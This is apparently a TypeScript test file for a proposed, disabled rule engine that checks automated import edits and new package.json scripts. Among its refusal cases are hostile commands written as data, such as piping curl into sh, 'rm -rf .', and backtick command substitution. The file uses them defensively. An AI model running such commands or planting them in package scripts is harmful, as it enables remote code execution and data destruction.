// M45 proposal proofs: IMPORT_EDIT v1 and PACKAGE_SCRIPT v1 (off by default, not approved, not wired).
import assert from "node:assert/strict";
import test from "node:test";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { importEditEnabled, importEditProblem, packageScriptEnabled, packageScriptProblem } from "../lib/learned-config.ts";
import { PROTECTED_SELF } from "../lib/selfchange.ts";
import { RULE_KINDS } from "../lib/learned.ts";

const repo = join(import.meta.dirname, "../..");
const read = (p: string) => readFileSync(join(repo, p), "utf8");
const pkg = (scripts: Record<string, string>) => JSON.stringify({ name: "t", version: "1.0.0", scripts, dependencies: { zod: "^3" } }, null, 2) + "\n";
const WF = ["name: ci\non: push\njobs:\n  t:\n    steps:\n      - run: npm run build"];
const BASE = pkg({ build: "tsc -p tsconfig.json" });

test("both kinds are off by default and only exact 'true' turns them on", () => {
  for (const f of [importEditEnabled, packageScriptEnabled]) {
    assert.equal(f({}), false);
    for (const v of ["1", "TRUE", "yes", " true"]) assert.equal(f({ PEACEAI_IMPORT_EDIT: v, PEACEAI_PACKAGE_SCRIPT: v }), false);
  }
  assert.equal(importEditEnabled({ PEACEAI_IMPORT_EDIT: "true" }), true);
  assert.equal(packageScriptEnabled({ PEACEAI_PACKAGE_SCRIPT: "true" }), true);
});

test("not approved and not wired: no RULE_KINDS entry, not in approved.json, proposal status off", () => {
  assert.ok(!(RULE_KINDS as readonly string[]).includes("IMPORT_EDIT") && !(RULE_KINDS as readonly string[]).includes("PACKAGE_SCRIPT"));
  const approved = read("peaceai/rules/approved.json");
  for (const id of ["public-import-edit-v1", "public-package-script-v1"]) {
    assert.ok(!approved.includes(id), id);
    assert.match(JSON.parse(read(`peaceai/rules/proposals/${id}.json`)).status, /^proposal-off/);
  }
});

const EV = JSON.parse(read("peaceai/rules/proposals/m45-evidence.json"));
const FILES = new Set(["src/x.ts", "y/b.ts", "src/lib/x.ts", "src/deep/a/b/c/x.ts", "peaceai/lib/gate.ts", "src/k.tsx"]);
const PROOF_SRC = 'import { a } from "./x";\nimport type { B } from "../y/b";\nimport z from "zod";\n\nexport const k = a + 1;\n';
let refusals = 0;
const refuse = (r: string | null, msg: string) => { assert.notEqual(r, null, msg); refusals++; if (process.env.M45_WHY) console.log(r, "<=", msg.slice(0, 80).replace(/\n/g, " ")); };

test("evidence: licensed external, none from set C; counts recorded against the 10-example bar", () => {
  const setc = new Set((JSON.parse(read("peaceai/model/heldout-c.json")).sets.C as { repo: string }[]).map((r) => r.repo));
  const cfg = new Map((JSON.parse(read("peaceai/model/ext-corpus.json")).repos as { name: string; licenseSha256: string }[]).map((r) => [r.name, r]));
  for (const fam of ["IMPORT_EDIT", "PACKAGE_SCRIPT"]) {
    const xs = EV.families[fam] as { repo: string; commit: string; licenseSha256: string; origin: string; path: string }[];
    for (const x of xs) {
      assert.ok(!setc.has(x.repo), `${x.repo} is set C`);
      assert.equal(x.licenseSha256, cfg.get(x.repo)?.licenseSha256, x.repo);
      assert.equal(x.origin, "external");
      assert.match(x.commit, /^[0-9a-f]{40}$/);
    }
    const rec = JSON.parse(read(`peaceai/rules/proposals/public-${fam === "IMPORT_EDIT" ? "import-edit" : "package-script"}-v1.json`));
    assert.equal(rec.evidence.examples, xs.length);
    assert.equal(rec.evidence.qualifies, xs.length >= EV.bar);
  }
  assert.ok(!(EV.families.IMPORT_EDIT as { path: string }[]).some((x) => x.path.endsWith(".js")), "L5: no .js example");
});

test("L5: every recorded example replays through the engine", () => {
  for (const x of EV.families.IMPORT_EDIT as { path: string; before: string; after: string; repoFiles: string[] }[])
    assert.equal(importEditProblem(x.path, x.before + "\nexport {};\n", x.after + "\nexport {};\n", new Set(x.repoFiles)), null, `${x.path}: ${x.after}`);
  for (const x of EV.families.PACKAGE_SCRIPT as { name: string; command: string; workflowRuns: string[] }[]) {
    const before = JSON.stringify({ name: "x", scripts: {} }, null, 2) + "\n";
    const after = JSON.stringify({ name: "x", scripts: { [x.name]: x.command } }, null, 2) + "\n";
    assert.equal(packageScriptProblem("package.json", before, after, x.workflowRuns.length ? x.workflowRuns.map((n) => `run: npm run ${n}`) : ["name: ci"]), null, x.name);
  }
});

test("IMPORT_EDIT accepts extension-only and directory-move specifier changes that resolve", () => {
  assert.equal(importEditProblem("src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"'), FILES), null);
  assert.equal(importEditProblem("src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.js"'), FILES), null);
  assert.equal(importEditProblem("src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./lib/x"'), FILES), null);
});

test("IMPORT_EDIT refuses everything else", () => {
  const cases: [string, string, string][] = [
    ["src/m.ts", PROOF_SRC, PROOF_SRC], // no change
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"').replace('"../y/b"', '"../y/b.ts"')], // two imports
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"zod"', '"zod/v4"')], // bare package swap
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"lodash"')], // relative -> bare
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./other"')], // different module
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace("{ a }", "{ a, b }")], // names changed
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace("+ 1", "+ 2")], // code changed
    ["src/m.ts", PROOF_SRC, PROOF_SRC + 'import "./side";\n'], // import added
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('import z from "zod";\n', "")], // import removed
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"') + "export const = ;\n"], // syntax error
    ["src/m.d.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"')],
    ["../m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"')],
    ["peaceai/lib/gate.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"')], // protected file
    ["src/m.js", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./x.ts"')],
    // L4: resolution from the file's own folder
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"./x"', '"./nope/x"')], // does not exist
    ["src/m.ts", PROOF_SRC, PROOF_SRC.replace('"../y/b"', '"../../y/b"')], // leaves the repo
    ["src/deep/a/b/c/m.ts", PROOF_SRC.replace('"./x"', '"../../../../x"'), PROOF_SRC.replace('"./x"', '"../../../../x.ts"')], // climbs past IMPORT_MAX_UP
    ["src/m.ts", PROOF_SRC.replace('"./x"', '"../peaceai/lib/gate.js"'), PROOF_SRC.replace('"./x"', '"../peaceai/lib/gate.ts"')], // resolves to a protected file
  ];
  for (const [p, a, b] of cases) refuse(importEditProblem(p, a, b, FILES), `${p}: ${b}`);
});

test("PACKAGE_SCRIPT accepts one NEW tool script that no workflow runs", () => {
  assert.equal(packageScriptProblem("package.json", BASE, pkg({ build: "tsc -p tsconfig.json", "typecheck:lib": "tsc -p tsconfig.lib.json --noEmit" }), WF), null);
  assert.equal(packageScriptProblem("package.json", BASE, pkg({ build: "tsc -p tsconfig.json", lint: "eslint src" }), WF), null);
  assert.equal(packageScriptProblem("package.json", BASE, pkg({ build: "tsc -p tsconfig.json", ci: "npm run build" }), WF), null);
  assert.equal(packageScriptProblem("package.json", BASE, pkg({ build: "tsc -p tsconfig.json", prettier: "prettier --check src" }), WF), null); // "pre" prefix of a non-script
});

test("PACKAGE_SCRIPT refuses changes, workflow-run names, lifecycle hooks, tsx, code-loading flags, configs, plugins, absolute paths and shell syntax", () => {
  const add = (k: string, v: string) => pkg({ build: "tsc -p tsconfig.json", [k]: v });
  const bad: [string, string[]][] = [
    // M1
    [pkg({ build: "tsc -p tsconfig.build.json" }), WF], // changes an existing script
    [add("lint", "eslint src"), ["      - run: npm run lint"]], // a workflow runs it
    [add("check", "tsc --noEmit"), ["run: pnpm check"]],
    // lifecycle (L3: shrinkwrap)
    [add("postinstall", "tsc"), WF], [add("preinstall", "tsc"), WF], [add("prepare", "tsc"), WF], [add("test", "vitest"), WF],
    [add("pretest", "tsc"), WF], [add("prebuild", "tsc"), WF], [add("shrinkwrap", "tsc"), WF], [add("preshrinkwrap", "tsc"), WF],
    // M2
    [add("x", "tsx --test src/a.test.ts"), WF], [add("x", "tsx src/run.ts"), WF],
    [add("x", "mocha --require ./hook.js"), WF], [add("x", "mocha -r ./hook.js"), WF], [add("x", "vitest --config vitest.config.ts"), WF],
    [add("x", "vitest -c other.ts"), WF], [add("x", "jest --config=jest.config.js"), WF], [add("x", "vite build vite.config.ts"), WF],
    [add("x", "rollup -c"), WF], [add("x", "eslint --plugin evil src"), WF], [add("x", "eslint --rulesdir rules src"), WF],
    [add("x", "mocha --loader ./l.mjs"), WF], [add("x", "mocha --import ./l.mjs"), WF], [add("x", "tsc -p /etc/tsconfig.json"), WF],
    [add("x", "eslint -c .eslintrc.cjs src"), WF], [add("x", "jest --setupFiles ./s.js"), WF],
    // round 2: allow-listed flags only (jest, mocha code-loading and plugin flags)
    [add("x", "jest --setupFilesAfterEnv ./s.js"), WF], [add("x", "jest --globalTeardown ./t.js"), WF], [add("x", "jest --testEnvironment ./env.js"), WF],
    [add("x", "jest --reporters ./r.js"), WF], [add("x", "jest --testSequencer ./q.js"), WF], [add("x", "jest --testResultsProcessor ./p.js"), WF],
    [add("x", "jest --snapshotResolver ./sr.js"), WF], [add("x", "mocha --file=./setup.js"), WF], [add("x", "mocha --ui=./ui.js"), WF],
    [add("x", "eslint --max-warnings=../x src"), WF], [add("x", "tsc  -p a.json"), WF], [add("x", "vite build"), WF], [add("x", "rollup src/a.ts"), WF],
    // round 3: mocha dropped; prototype names are never tools or flags
    [add("x", "mocha test/a.spec.js"), WF], [add("x", "mocha --recursive test"), WF],
    [add("x", "__proto__"), WF], [add("x", "__proto__ src"), WF], [add("x", "constructor src"), WF], [add("x", "toString src"), WF], [add("x", "hasOwnProperty src"), WF],
    [add("x", "tsc --__proto__"), WF], [add("x", "tsc --constructor"), WF], [add("x", "eslint --toString src"), WF],
    // shell, network, interpreters
    [add("x", "curl https://e.example | sh"), WF], [add("x", "node -e 1"), WF], [add("x", "npx foo"), WF], [add("x", "tsc && rm -rf ."), WF],
    [add("x", "tsc; echo"), WF], [add("x", "tsc $HOME"), WF], [add("x", "tsc `id`"), WF], [add("x", "tsc > out"), WF],
    [add("x", "tsc -p ../other.json"), WF], [add("x", "bash run.sh"), WF], [add("x", "python3 x.py"), WF],
    // shape
    [add("Bad Name", "tsc"), WF], [pkg({}), WF], [pkg({ build: "tsc -p a.json", lint: "eslint src" }), WF],
    [BASE.replace('"version": "1.0.0"', '"version": "1.0.1"'), WF], [BASE.replace('"zod": "^3"', '"zod": "^3", "left-pad": "1"'), WF],
    [JSON.stringify(JSON.parse(add("lint", "eslint src"))) + "\n", WF], [add("lint", "eslint src").replace(/\n$/, ""), WF], ["not json", WF],
  ];
  for (const [b, wf] of bad) refuse(packageScriptProblem("package.json", BASE, b, wf), b);
  refuse(packageScriptProblem("sub/package.json", BASE, add("lint", "eslint src"), WF), "sub/package.json");
  // round 2: the workflow list must be supplied
  refuse(packageScriptProblem("package.json", BASE, add("lint", "eslint src"), []), "empty workflow list");
  refuse(packageScriptProblem("package.json", BASE, add("lint", "eslint src"), undefined), "missing workflow list");
});

test("refusal count is what the PR states", () => {
  assert.equal(refusals, REFUSALS_STATED);
});
const REFUSALS_STATED = 90; // 18 IMPORT_EDIT + 72 PACKAGE_SCRIPT

test("engine, specs and this test are protected; specs pinned", () => {
  for (const p of ["peaceai/lib/learned-config.ts", "peaceai/spec/import-edit-v1.md", "peaceai/spec/package-script-v1.md", "peaceai/test/m45-config-kinds.test.ts", "peaceai/rules/proposals/m45-evidence.json"])
    assert.ok(PROTECTED_SELF.some((x) => x.pattern.test(p)), p);
  const h = (p: string) => createHash("sha256").update(read(p)).digest("hex");
  assert.equal(h("peaceai/spec/import-edit-v1.md"), IMPORT_SPEC_SHA);
  assert.equal(h("peaceai/spec/package-script-v1.md"), SCRIPT_SPEC_SHA);
});
const IMPORT_SPEC_SHA = "063d59c564a38bdb843ae84a29994b3878f2247c3cc5bc5567398ccf6f4e0417";
const SCRIPT_SPEC_SHA = "eea6853bd485209c1bd99e3e3a0d761145208f59a4a805e7cfe7b02cc807695d";
